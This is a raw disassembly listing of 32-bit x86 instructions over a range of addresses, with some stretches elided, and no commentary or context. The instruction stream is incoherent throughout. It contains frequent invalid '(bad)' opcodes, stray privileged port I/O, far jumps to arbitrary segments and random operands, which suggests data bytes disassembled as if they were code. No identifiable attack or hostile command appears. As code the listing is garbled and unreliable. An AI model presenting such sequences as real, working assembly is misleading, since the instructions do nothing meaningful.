  42db41:	fld    QWORD PTR ds:0x33612dd4
  42db47:	repnz add edx,DWORD PTR [ebx+0x45]
  42db4b:	or     ebx,esp
  42db4d:	mov    al,ds:0x90163689
  42db52:	mov    edi,0x10306e6d
  42db57:	addr16 loope 0x42dbac
  42db5a:	pop    eax
  42db5b:	cmp    eax,0x55d33f89
  42db60:	sub    esi,ebp
  42db62:	mov    ch,0x1c
  42db64:	jns    0x42db9a
  42db66:	adc    esp,ecx
  42db68:	imul   esp,DWORD PTR [ecx+0x9326b5],0x0
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dc3f
  42dbe3:	cs inc edi
  42dbe5:	pop    eax
  42dbe6:	push   esp
  42dbe7:	jmp    0x141dbed
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	pushf  
  42dbef:	js     0x42dbc8
  42dbf1:	add    ecx,DWORD PTR [ebx-0xb]
  42dbf4:	inc    esp
  42dbf5:	jno    0x42db80
  42dbf7:	xchg   ebx,eax
  42dbf8:	add    al,0x86
  42dbfa:	(bad)  
  42dbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbfc:	rcr    DWORD PTR [esi-0x55b61cd1],0xc
  42dc03:	dec    edx
  42dc04:	loopne 0x42dbdc
  42dc06:	jecxz  0x42dbe5
  42dc08:	mov    edx,0xe03ab945
  42dc0d:	sub    BYTE PTR [edi+0x3193f7a8],bh
  42dc13:	popa   
  42dc14:	retf   
  42dc15:	clc    
  42dc16:	or     BYTE PTR [ebx+0x2860d667],dh
  42dc1c:	dec    edi
  42dc1d:	popf   
  42dc1e:	sbb    eax,DWORD PTR [ecx-0x44]
  42dc21:	xor    al,BYTE PTR fs:[ebx+0x2d]
  42dc25:	xchg   ebp,eax
  42dc26:	xor    BYTE PTR [ebx-0x27],0x4c
  42dc2a:	push   0xdaf63b8c
  42dc2f:	or     cl,ah
  42dc31:	int3   
  42dc32:	std    
  42dc33:	cmp    DWORD PTR [edx+ebp*4-0x2e],edx
  42dc37:	sub    DWORD PTR [edi+0x5b260dab],esi
  42dc3d:	ss popf 
  42dc3f:	jno    0x42dc60
  42dc41:	div    BYTE PTR [edi]
  42dc43:	mov    ah,0x68
  42dc45:	push   edx
  42dc46:	xchg   dh,bh
  42dc48:	mov    esi,0x8ad07190
  42dc4d:	sbb    al,0x24
  42dc4f:	sub    BYTE PTR [ecx],dh
  42dc51:	adc    eax,0xcca60b05
  42dc56:	cdq    
  42dc57:	fcomi  st,st(5)
  42dc59:	cmp    esi,esp
  42dc5b:	mov    edx,DWORD PTR [ecx+0x6b]
  42dc5e:	stos   DWORD PTR es:[edi],eax
  42dc5f:	fidivr WORD PTR [ebp+0x4f469ed2]
  42dc65:	jge    0x42dcab
  42dc67:	xchg   edi,eax
  42dc68:	mov    bh,0x78
  42dc6a:	sar    ebx,cl
  42dc6c:	pop    es
  42dc6d:	in     eax,dx
  42dc6e:	loope  0x42dcab
  42dc70:	mov    ch,0xf3
  42dc72:	mov    DWORD PTR es:[edi],ebp
  42dc75:	sub    BYTE PTR [ecx-0x58],dl
  42dc78:	push   ebp
  42dc79:	add    dh,BYTE PTR [eax+0x777cd533]
  42dc7f:	test   al,0x92
  42dc81:	pop    ss
  42dc82:	pop    eax
  42dc83:	jae    0x42dc6c
  42dc85:	loopne 0x42dca1
  42dc87:	shl    BYTE PTR [edx+edx*1-0x1f14057b],cl
  42dc8e:	push   0xffffffd9
  42dc90:	mov    edi,0xcacf9198
  42dc95:	shr    ebx,1
  42dc97:	scas   al,BYTE PTR es:[edi]
  42dc98:	in     eax,dx
  42dc99:	sbb    dh,ch
  42dc9b:	gs inc esi
  42dc9d:	cdq    
  42dc9e:	retf   
  42dc9f:	aaa    
  42dca0:	jl     0x42dc6c
  42dca2:	adc    cl,BYTE PTR [edx-0x652c6dfc]
  42dca8:	mov    eax,esp
  42dcaa:	jge    0x42dc3e
  42dcac:	pusha  
  42dcad:	popf   
  42dcae:	cwde   
  42dcaf:	cmc    
  42dcb0:	add    eax,0xa24e48ae
  42dcb5:	enter  0x15ae,0x45
  42dcb9:	adc    ecx,DWORD PTR ds:0x51ff59e4
  42dcbf:	mov    ch,0x2e
  42dcc1:	mov    cl,0x7c
  42dcc3:	sub    ebx,esi
  42dcc5:	xchg   esi,eax
  42dcc6:	loopne 0x42dd2e
  42dcc8:	std    
  42dcc9:	cwde   
  42dcca:	mov    dh,0x26
  42dccc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dcce:	call   0xf503:0xbfe7a631
  42dcd5:	xchg   esp,eax
  42dcd6:	or     eax,0x1160dbf1
  42dcdb:	fnstsw WORD PTR [esp+ebx*2+0x4452325]
  42dce2:	out    0x6b,eax
  42dce4:	and    DWORD PTR [edi+0x5dbb702a],ebp
  42dcea:	rol    DWORD PTR [ebx],0x40
	...
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	and    DWORD PTR [esp+edx*2],eax
  42dd65:	mov    al,0x53
  42dd67:	jmp    0x0:0xff0001
  42dd6e:	xor    esi,DWORD PTR [esi]
  42dd70:	call   0xce9a:0x9daf88ee
  42dd77:	jmp    0x42dd47
  42dd79:	into   
  42dd7a:	loop   0x42dd7a
  42dd7c:	and    dh,bl
  42dd7e:	cmp    BYTE PTR [esi+0x74b821a2],dh
  42dd84:	dec    eax
  42dd85:	(bad)  
  42dd86:	enter  0x2b27,0x27
  42dd8a:	outs   dx,DWORD PTR ds:[esi]
  42dd8b:	fdiv   DWORD PTR [edx+esi*8-0x4a]
  42dd8f:	push   esi
  42dd90:	jge    0x42dda5
  42dd92:	mov    dl,0x2b
  42dd94:	sub    BYTE PTR cs:[edx],cl
  42dd97:	jecxz  0x42dd23
  42dd99:	ror    DWORD PTR [ecx-0xb],0x91
  42dd9d:	test   al,0x99
  42dd9f:	in     al,0x56
  42dda1:	sahf   
  42dda2:	fwait
  42dda3:	sub    edx,DWORD PTR [ebx+esi*2-0x1c]
  42dda7:	xchg   esp,eax
  42dda8:	arpl   WORD PTR cs:[edi-0xc],cx
  42ddac:	push   ebp
  42ddad:	inc    ebx
  42ddae:	inc    eax
  42ddaf:	sub    al,0xc1
  42ddb1:	out    0x3f,al
  42ddb3:	mov    ds:0xd94daff1,eax
  42ddb8:	and    cl,BYTE PTR [ebx+0x612ea612]
  42ddbe:	pop    ebx
  42ddbf:	hlt    
  42ddc0:	push   esi
  42ddc1:	cdq    
  42ddc2:	int3   
  42ddc3:	loop   0x42ddc1
  42ddc5:	xchg   edi,eax
  42ddc6:	mov    bh,0xa
  42ddc8:	dec    ecx
  42ddc9:	pop    esp
  42ddca:	nop
  42ddcb:	sub    BYTE PTR [esi+ebx*1],0x80
  42ddcf:	dec    edi
  42ddd0:	mov    DWORD PTR [ebx-0x9],ebx
  42ddd3:	mov    ebp,0x804b93e6
  42ddd8:	(bad)  
  42ddd9:	push   cs
  42ddda:	inc    esp
  42dddb:	xchg   ebx,eax
  42dddc:	or     DWORD PTR [ecx+0x1fc1d2d9],ebp
  42dde2:	imul   edx,DWORD PTR [esi+0x2c],0x7b23eacd
  42dde9:	hlt    
  42ddea:	inc    ecx
  42ddeb:	aaa    
  42ddec:	loope  0x42de60
  42ddee:	call   0xa17dde2a
  42ddf3:	jmp    0x42dd80
  42ddf5:	fsubp  st(7),st
  42ddf7:	jg     0x42ddb6
  42ddf9:	push   0x6c
  42ddfb:	push   edi
  42ddfc:	xchg   edx,eax
  42ddfd:	repz cli 
  42ddff:	cmp    BYTE PTR [ebp+0x5f],0x5d
  42de03:	cld    
  42de04:	xor    bh,0xf2
  42de07:	push   ds
  42de08:	pusha  
  42de09:	xchg   esi,eax
  42de0a:	add    eax,0xffa65289
  42de0f:	iret   
  42de10:	and    al,0x38
  42de12:	fnstcw WORD PTR ds:0x75751776
  42de18:	adc    BYTE PTR [edx+0x7825f75e],bh
  42de1e:	pop    edi
  42de1f:	xchg   ecx,eax
  42de20:	dec    ebx
  42de21:	sbb    DWORD PTR [esi+0x688ed08f],edx
  42de27:	scas   al,BYTE PTR es:[edi]
  42de28:	in     al,0xee
  42de2a:	(bad)  
  42de2b:	push   eax
  42de2c:	inc    ebx
  42de2d:	ins    DWORD PTR es:[edi],dx
  42de2e:	dec    edx
  42de2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de30:	icebp  
  42de31:	daa    
  42de32:	test   eax,0x4e9d33fd
  42de37:	(bad)  
  42de38:	fisttp WORD PTR [esi-0x7d]
  42de3b:	and    ah,BYTE PTR [edi+0xe065cd3]
  42de41:	popf   
  42de42:	xchg   ecx,eax
  42de43:	cmc    
  42de44:	pop    edx
  42de45:	test   DWORD PTR [ebx],0xcca57ad0
  42de4b:	pop    ss
  42de4c:	mov    esp,0xba442948
  42de51:	es jo  0x42ddd4
  42de54:	rcl    BYTE PTR [edi+0x16fcb7da],cl
  42de5a:	pop    edi
  42de5b:	mov    dl,0x23
  42de5d:	add    DWORD PTR [ebp+0x50],ecx
  42de60:	fidivr WORD PTR [edi]
  42de62:	and    eax,0xbc4ee49f
  42de67:	sub    al,0xab
  42de69:	inc    ebx
  42de6a:	xor    DWORD PTR [ebp+0x73],ecx
	...
  42ded4:	add    BYTE PTR [eax],al
  42ded6:	out    0x82,al
  42ded8:	lods   eax,DWORD PTR ds:[esi]
  42ded9:	xor    ebp,ebp
  42dedb:	aas    
  42dedc:	(bad)  
  42dedd:	xlat   BYTE PTR ds:[ebx]
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	popa   
  42dee3:	pop    ecx
  42dee4:	in     al,dx
  42dee5:	aas    
  42dee6:	push   edx
  42dee7:	jmp    0x42deea
  42dee9:	add    bh,bh
  42deeb:	add    BYTE PTR [eax],al
  42deed:	add    BYTE PTR [ebx-0x34ce52ee],ch
  42def3:	out    dx,eax
  42def4:	ficomp DWORD PTR ds:[ebp-0x28f5f074]
  42defb:	sbb    eax,0x7c044298
  42df00:	jnp    0x42df41
  42df02:	cwde   
  42df03:	pop    ecx
  42df04:	arpl   dx,di
  42df06:	sub    eax,0xa1e372f2
  42df0b:	or     eax,0x3852ab57
  42df10:	loopne 0x42dee7
  42df12:	(bad)  
  42df13:	lock sar BYTE PTR [edi-0x7e],cl
  42df17:	pop    esp
  42df18:	rol    DWORD PTR [edx+eiz*2],cl
  42df1b:	mov    esp,0x5aa13e50
  42df20:	jge    0x42df20
  42df22:	inc    ebp
  42df23:	dec    edi
  42df24:	into   
  42df25:	inc    ebx
  42df26:	mov    edi,0x9b039c4c
  42df2b:	jae    0x42deb0
  42df2d:	fild   WORD PTR [edx-0x41a29e7d]
  42df33:	xchg   BYTE PTR [ebx+ebx*2],bl
  42df36:	lods   al,BYTE PTR ds:[esi]
  42df37:	out    dx,al
  42df38:	retf   
  42df39:	inc    eax
  42df3a:	bound  ebp,QWORD PTR [ecx+esi*2-0x5748ed84]
  42df41:	mov    esi,0xe9ffa997
  42df46:	push   ebx
  42df47:	mov    edi,DWORD PTR ds:0x13a25e6e
  42df4d:	or     eax,0x2e2673b
  42df52:	push   es
  42df53:	xor    eax,esp
  42df55:	xor    ebx,DWORD PTR [ebp+0xe]
  42df58:	fld    DWORD PTR ds:0x64ff702c
  42df5e:	jbe    0x42df6f
  42df60:	dec    esi
  42df61:	(bad)  
  42df62:	jge    0x42df93
  42df64:	adc    edi,DWORD PTR [edx-0x2f]
  42df67:	add    esi,0x1c
  42df6a:	addr16 dec edx
  42df6c:	cli    
  42df6d:	sub    esi,ebp
  42df6f:	xor    dl,BYTE PTR [edx]
  42df71:	pushf  
  42df72:	mov    edi,0xa9555f28
  42df77:	mov    ecx,0xb2e71339
  42df7d:	(bad)  
  42df7f:	mov    esi,0x2f9ed68a
  42df84:	sbb    eax,0xc6bb0b50
  42df89:	lea    esi,[ebx]
  42df8b:	jo     0x42dfb2
  42df8d:	cs dec eax
  42df8f:	sub    BYTE PTR [ebx+0x1cd04f73],dl
  42df95:	and    al,0xfa
  42df97:	sbb    eax,0xdc1933f7
  42df9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df9d:	push   0x7244f90b
  42dfa2:	mov    ds:0xb0922386,al
  42dfa7:	ins    DWORD PTR es:[edi],dx
  42dfa8:	jo     0x42df64
  42dfaa:	fst    QWORD PTR [ebp-0x1c]
  42dfad:	sbb    al,0x2e
  42dfaf:	out    0x5e,al
  42dfb1:	jl     0x42df70
  42dfb3:	aas    
  42dfb4:	fist   DWORD PTR [eax-0x5a]
  42dfb7:	pop    esp
  42dfb8:	dec    edi
  42dfb9:	rol    DWORD PTR [ebx],0x95
  42dfbc:	fdiv   st,st(2)
  42dfbe:	pop    esp
  42dfbf:	xor    eax,0xc2147cd3
  42dfc4:	push   0xa21b99d3
  42dfc9:	or     al,BYTE PTR [esi+0x5af3a5c9]
  42dfcf:	pop    eax
  42dfd0:	loop   0x42e040
  42dfd2:	sbb    dl,ch
  42dfd4:	out    0x1d,al
  42dfd6:	leave  
  42dfd7:	pop    es
  42dfd8:	pop    eax
  42dfd9:	data16 sub al,0x99
  42dfdc:	sti    
  42dfdd:	lea    edx,[ecx-0x3e0f7572]
  42dfe3:	into   
  42dfe4:	sub    eax,0x78b5ad32
  42dfe9:	fldcw  WORD PTR [edi+0x3a14]
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi+0x53]
  42e063:	bound  esp,QWORD PTR [edx]
  42e065:	inc    edi
  42e066:	push   ecx
  42e067:	in     al,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	inc    DWORD PTR [eax]
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	ss retf 0x4268
  42e072:	ins    DWORD PTR es:[edi],dx
  42e073:	ret    0x1618
  42e076:	pop    esi
  42e077:	mov    al,0x8
  42e079:	dec    eax
  42e07a:	cmp    DWORD PTR [edx],ebx
  42e07c:	jecxz  0x42e020
  42e07e:	cmp    al,0x30
  42e080:	aam    0xc5
  42e082:	and    DWORD PTR [ecx+0xf],ebx
  42e085:	sbb    eax,0xaf7767b3
  42e08a:	pop    ss
  42e08b:	push   ecx
  42e08c:	out    0x3,eax
  42e08e:	cmp    eax,0x17ea27db
  42e093:	and    al,0x97
  42e095:	pop    edi
  42e096:	sahf   
  42e097:	push   edi
  42e098:	or     eax,DWORD PTR ds:[esp+ebx*4+0x13]
  42e09d:	jg     0x42e09d
  42e09f:	repnz mov eax,0x535942a0
  42e0a5:	loope  0x42e093
  42e0a7:	clc    
  42e0a8:	int    0x51
  42e0aa:	adc    eax,0xb394389
  42e0af:	mov    al,ch
  42e0b1:	add    eax,0xc196cee8
  42e0b6:	cmp    al,0x8d
  42e0b8:	ja     0x42e0d7
  42e0ba:	push   0x841e3e01
  42e0bf:	and    edi,0x78a0ae5c
  42e0c5:	jecxz  0x42e0c6
  42e0c7:	xor    esi,DWORD PTR [ebp*4-0x52d6d8fe]
  42e0ce:	jmp    0x42e0ad
  42e0d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0d1:	pop    esp
  42e0d2:	in     al,dx
  42e0d3:	push   ebx
  42e0d4:	jg     0x42e09b
  42e0d6:	xchg   esi,eax
  42e0d7:	aam    0xaf
  42e0d9:	push   eax
  42e0da:	shl    DWORD PTR [ecx+ebp*2-0x63],0x5c
  42e0df:	xchg   DWORD PTR [ebx+0x43],edx
  42e0e2:	pop    ebx
  42e0e3:	fdivrp st(4),st
  42e0e5:	loope  0x42e137
  42e0e7:	das    
  42e0e8:	cdq    
  42e0e9:	dec    eax
  42e0ea:	sub    BYTE PTR [ecx+edi*4],cl
  42e0ed:	or     al,0xb7
  42e0ef:	mov    ch,0x95
  42e0f1:	jns    0x42e09f
  42e0f3:	dec    eax
  42e0f4:	fldpi  
  42e0f6:	mov    gs:0xff40c422,ax
  42e0fd:	ja     0x42e111
  42e0ff:	retf   0x5877
  42e102:	push   edi
  42e103:	add    BYTE PTR [eax],dl
  42e105:	sahf   
  42e106:	out    0xa1,al
  42e108:	out    dx,al
  42e109:	jns    0x42e150
  42e10b:	sbb    al,0x26
  42e10d:	push   cs
  42e10e:	test   eax,0x592afda7
  42e113:	mov    edi,0xb52d237e
  42e118:	lahf   
  42e119:	repnz popf 
  42e11b:	std    
  42e11c:	pushf  
  42e11d:	add    DWORD PTR [ecx+0x5d84c9d4],0x17
  42e124:	or     eax,ebp
  42e126:	retf   
  42e127:	aam    0xf6
  42e129:	(bad)  
  42e12a:	gs pop ss
  42e12c:	aad    0x17
  42e12e:	jo     0x42e155
  42e130:	xor    bh,al
  42e132:	pop    edx
  42e133:	mov    BYTE PTR [esi],ch
  42e135:	mov    ?,WORD PTR [edi+0x1bda79f0]
  42e13b:	iret   
  42e13c:	pop    ebp
  42e13d:	dec    ecx
  42e13e:	bound  ebp,QWORD PTR [eax]
  42e140:	or     dl,al
  42e142:	dec    ecx
  42e143:	pminsw mm0,QWORD PTR [edi]
  42e146:	xchg   ebx,ecx
  42e148:	pop    DWORD PTR [esi+0x50]
  42e14b:	ja     0x42e0fe
  42e14d:	mov    ah,0xea
  42e150:	mov    BYTE PTR [edi],dh
  42e152:	sub    ah,BYTE PTR [ecx+0x75792aab]
  42e158:	shl    edi,cl
  42e15a:	xchg   bp,ax
  42e15c:	push   ds
  42e15d:	sbb    ecx,0xde4d3ba2
  42e163:	ss pushf 
  42e165:	aas    
  42e166:	sahf   
  42e167:	cmp    eax,0x813e9f25
	...
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	add    al,0x64
  42e1e4:	mov    ch,dh
  42e1e6:	push   eax
  42e1e7:	in     eax,dx
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	inc    DWORD PTR [eax]
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	xchg   edx,eax
  42e1ef:	popf   
  42e1f0:	outs   dx,DWORD PTR ds:[esi]
  42e1f1:	mov    edx,0xa7f72a48
  42e1f6:	fisubr WORD PTR [ecx-0x5cb37f65]
  42e1fc:	cmp    al,0x42
  42e1fe:	out    dx,eax
  42e1ff:	cmp    al,0x95
  42e201:	stos   BYTE PTR es:[edi],al
  42e202:	lds    edx,FWORD PTR [eax]
  42e204:	mov    al,0x0
  42e206:	loop   0x42e258
  42e208:	mov    eax,0x2fd39c6a
  42e20d:	ja     0x42e208
  42e20f:	sub    DWORD PTR [edi],0x7
  42e212:	call   0x7c6aba92
  42e217:	jg     0x42e264
  42e219:	cmc    
  42e21a:	xor    al,0x17
  42e21c:	or     DWORD PTR [edx-0x63837005],ebx
  42e222:	out    dx,al
  42e223:	cmp    DWORD PTR [edi-0x1f],edx
  42e226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e227:	bnd jg 0x42e201
  42e22a:	push   ebp
  42e22b:	cdq    
  42e22c:	sahf   
  42e22d:	les    esi,FWORD PTR [edx-0x43]
  42e230:	and    DWORD PTR [edi+0x24],edx
  42e233:	stos   DWORD PTR es:[edi],eax
  42e234:	into   
  42e235:	(bad)  
  42e236:	cs cld 
  42e238:	jo     0x42e286
  42e23a:	jg     0x42e25e
  42e23c:	cdq    
  42e23d:	ss pop esp
  42e23f:	pop    eax
  42e240:	test   dl,0x37
  42e243:	mov    al,ds:0x23279935
  42e248:	mov    cl,0xf1
  42e24a:	loop   0x42e28b
  42e24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e24d:	sub    BYTE PTR [edx-0x79ac4a9c],cl
  42e253:	pop    edi
  42e254:	inc    ecx
  42e255:	jns    0x42e1e6
  42e257:	stc    
  42e258:	int3   
  42e259:	add    al,0x13
  42e25b:	mov    al,ds:0xbd35773d
  42e260:	sub    al,0xb9
  42e262:	mov    eax,ds:0xb11a4d75
  42e267:	les    esp,FWORD PTR [edx+0x14f25aa0]
  42e26d:	push   esi
  42e26e:	rcl    eax,cl
  42e270:	xchg   ebx,eax
  42e271:	mov    cl,0x6b
  42e273:	clc    
  42e274:	sbb    ch,ah
  42e276:	shl    BYTE PTR [ebx-0x3a],1
  42e279:	jge    0x42e2a5
  42e27b:	arpl   WORD PTR [edi+0x3849bee2],si
  42e281:	retf   
  42e282:	daa    
  42e283:	sub    BYTE PTR [edi-0x53d9fab4],bl
  42e289:	lods   eax,DWORD PTR ds:[esi]
  42e28a:	pop    ebp
  42e28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e28c:	loopne 0x42e26d
  42e28e:	(bad)  
  42e28f:	inc    eax
  42e290:	jne    0x42e2f8
  42e292:	cmp    DWORD PTR [edx-0xa],esp
  42e295:	loop   0x42e279
  42e297:	dec    esi
  42e298:	jnp    0x42e267
  42e29a:	xchg   edi,eax
  42e29b:	xor    dh,BYTE PTR [edx+0x12]
  42e29e:	push   ebp
  42e29f:	sub    edx,esp
  42e2a1:	jge    0x42e257
  42e2a3:	jmp    0x197a5030
  42e2a8:	push   ecx
  42e2a9:	ror    BYTE PTR [esi+0x598e7e02],1
  42e2af:	mov    eax,0x6cfaaf3a
  42e2b4:	cld    
  42e2b5:	or     esi,edi
  42e2b7:	icebp  
  42e2b8:	mov    al,0xf7
  42e2ba:	add    BYTE PTR [esi-0x5],ah
  42e2bd:	fldln2 
  42e2bf:	push   esp
  42e2c0:	add    BYTE PTR [eax-0x32],cl
  42e2c3:	dec    esi
  42e2c4:	test   eax,esp
  42e2c6:	push   esp
  42e2c7:	pop    DWORD PTR [ebx+0x30d95226]
  42e2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2ce:	retf   0x9de2
  42e2d1:	fadd   st,st(2)
  42e2d3:	out    dx,eax
  42e2d4:	mov    ds:0xfee1265d,al
  42e2d9:	stos   DWORD PTR es:[edi],eax
  42e2da:	mov    ecx,esi
  42e2dc:	push   ss
  42e2dd:	adc    DWORD PTR [edi],ecx
  42e2df:	lods   al,BYTE PTR ds:[esi]
  42e2e0:	arpl   WORD PTR [edi-0x1e],bp
  42e2e3:	pushf  
  42e2e4:	pop    esi
  42e2e5:	jb     0x42e33d
  42e2e7:	cmp    edx,DWORD PTR [eax-0x714ad5f5]
	...
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0x3f199140
  42e363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e364:	mov    dh,0x7b
  42e366:	dec    edi
  42e367:	out    dx,al
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	inc    DWORD PTR [eax]
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	adc    BYTE PTR [esi],0xe9
  42e371:	and    al,0xf6
  42e373:	jbe    0x42e357
  42e375:	mov    eax,DWORD PTR [ecx-0x48]
  42e378:	or     BYTE PTR [eax-0x3ee6d493],ch
  42e37e:	adc    dh,al
  42e380:	push   esi
  42e381:	(bad)  
  42e382:	cmp    al,0xbb
  42e384:	aaa    
  42e385:	stos   BYTE PTR es:[edi],al
  42e386:	mov    ah,0xda
  42e388:	xchg   esp,eax
  42e389:	out    dx,al
  42e38a:	pop    esi
  42e38b:	das    
  42e38c:	mov    eax,ds:0x5ce4aa4b
  42e391:	sar    DWORD PTR [ebx],1
  42e393:	mov    bh,0xa9
  42e395:	pop    esi
  42e396:	stc    
  42e397:	mov    ecx,0xb7222063
  42e39c:	mov    edi,0x4b48cfce
  42e3a1:	outs   dx,BYTE PTR ds:[esi]
  42e3a2:	pusha  
  42e3a3:	aas    
  42e3a4:	mov    dl,0x15
  42e3a6:	call   DWORD PTR [ebx+0x760d12c8]
  42e3ac:	outs   dx,DWORD PTR ds:[esi]
  42e3ad:	dec    edx
  42e3ae:	fcmove st,st(6)
  42e3b0:	pushf  
  42e3b1:	mov    bl,0xf5
  42e3b3:	aad    0xb4
  42e3b5:	out    dx,eax
  42e3b6:	or     al,0x7d
  42e3b8:	addr16 and al,0xa
  42e3bb:	and    ecx,edi
  42e3bd:	and    edx,ebx
  42e3bf:	aas    
  42e3c0:	dec    ecx
  42e3c1:	retf   0x38f0
  42e3c4:	and    ebp,DWORD PTR [eax]
  42e3c6:	mov    cl,0xa
  42e3c8:	rol    edx,1
  42e3ca:	int3   
  42e3cb:	mov    cl,0x85
  42e3cd:	(bad)  
  42e3ce:	aad    0x82
  42e3d0:	push   esp
  42e3d1:	sbb    dl,BYTE PTR [edx]
  42e3d3:	sbb    al,0xec
  42e3d5:	outs   dx,DWORD PTR ds:[esi]
  42e3d6:	mov    DWORD PTR [edi-0x22f306ec],edi
  42e3dc:	pop    edx
  42e3dd:	aam    0x97
  42e3df:	mov    bl,0xc7
  42e3e1:	call   0x6fc3cd64
  42e3e6:	stc    
  42e3e7:	arpl   bx,si
  42e3e9:	popa   
  42e3ea:	dec    esp
  42e3eb:	sti    
  42e3ec:	popa   
  42e3ed:	aam    0x52
  42e3ef:	sub    eax,edi
  42e3f1:	sbb    dh,BYTE PTR [edx+0x60]
  42e3f4:	adc    DWORD PTR gs:[edx+ebp*4+0x47b7cc46],ebx
  42e3fc:	rcl    esp,1
  42e3fe:	test   al,0xe6
  42e400:	ins    DWORD PTR es:[edi],dx
  42e401:	jae    0x42e388
  42e403:	pushf  
  42e404:	inc    edi
  42e405:	test   DWORD PTR [ecx-0x4fd10f86],esi
  42e40b:	mov    edx,0x1e5535a6
  42e410:	(bad)
  42e413:	lock outs dx,BYTE PTR ds:[esi]
  42e415:	das    
  42e416:	push   ebx
  42e417:	retf   
  42e418:	in     al,dx
  42e419:	mov    cl,0x2b
  42e41b:	aas    
  42e41c:	popf   
  42e41d:	and    BYTE PTR [esi-0x68e9ec86],dl
  42e423:	cmovo  ecx,DWORD PTR [ebx+edi*1]
  42e427:	ins    DWORD PTR es:[edi],dx
  42e428:	lds    ebp,FWORD PTR [ebp+0xe]
  42e42b:	repnz scas eax,DWORD PTR es:[edi]
  42e42d:	xor    BYTE PTR [eax-0x5e],ah
  42e430:	sti    
  42e431:	sbb    eax,ebx
  42e433:	test   esi,0xdc7044f6
  42e439:	dec    ebp
  42e43a:	and    BYTE PTR [esi+0x7cefbdd4],dl
  42e440:	xchg   ecx,eax
  42e441:	xchg   ecx,esp
  42e443:	sbb    eax,0x433a8045
  42e448:	pop    ss
  42e449:	add    bl,BYTE PTR [edi-0x3e63d483]
  42e44f:	dec    esi
  42e450:	(bad)  
  42e451:	popf   
  42e452:	sub    esp,DWORD PTR [edi]
  42e454:	fst    DWORD PTR [ecx+0x24a4d2a2]
  42e45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e45b:	or     eax,DWORD PTR [ecx+ebp*8]
  42e45e:	sbb    ebp,DWORD PTR [edi+0x11de790]
  42e464:	pop    ds
  42e465:	fsubr  st,st(4)
  42e467:	and    DWORD PTR [ebx+0xf],ebp
  42e46a:	sahf   
  42e46b:	iret   
  42e46c:	call   0x0:0x0
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	sub    dh,BYTE PTR [ebp-0x44]
  42e4e5:	mov    ds:0x1ef4e,eax
  42e4ea:	inc    DWORD PTR [eax]
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	fiadd  WORD PTR [eax+edx*8+0x56]
  42e4f2:	dec    esi
  42e4f3:	push   es
  42e4f4:	pop    es
  42e4f5:	jno    0x42e4ca
  42e4f7:	xchg   esi,eax
  42e4f8:	data16 aaa 
  42e4fa:	xchg   esi,eax
  42e4fb:	stc    
  42e4fc:	and    esi,ecx
  42e4fe:	je     0x42e4c5
  42e500:	lock ret 0x8767
  42e504:	push   esp
  42e505:	jmp    0x5d573a
  42e50a:	mov    esp,DWORD PTR [ebx+0x38]
  42e50d:	test   eax,0x4154b5eb
  42e512:	mov    ah,0xcb
  42e514:	ins    DWORD PTR es:[edi],dx
  42e515:	fs mov dx,0xea12
  42e51a:	(bad)  
  42e51b:	inc    eax
  42e51c:	pop    ecx
  42e51d:	fdivr  st,st(6)
  42e51f:	mov    edx,0x95c2fe3d
  42e524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e525:	je     0x42e568
  42e527:	ja     0x42e59f
  42e529:	pop    ds
  42e52a:	add    DWORD PTR [ebx],eax
  42e52c:	push   ebp
  42e52d:	xor    BYTE PTR [esi-0x4c],dh
  42e530:	cmc    
  42e531:	(bad)  
  42e532:	mov    ch,ch
  42e534:	sub    ch,ch
  42e536:	push   ds
  42e537:	mov    eax,0x50c81604
  42e53c:	hlt    
  42e53d:	sar    al,cl
  42e53f:	dec    ebx
  42e540:	or     eax,0x591040b5
  42e545:	cmp    al,0xab
  42e547:	fimul  DWORD PTR [ecx]
  42e549:	call   0xab139dfd
  42e54e:	push   ss
  42e54f:	in     eax,0xa8
  42e551:	pop    edi
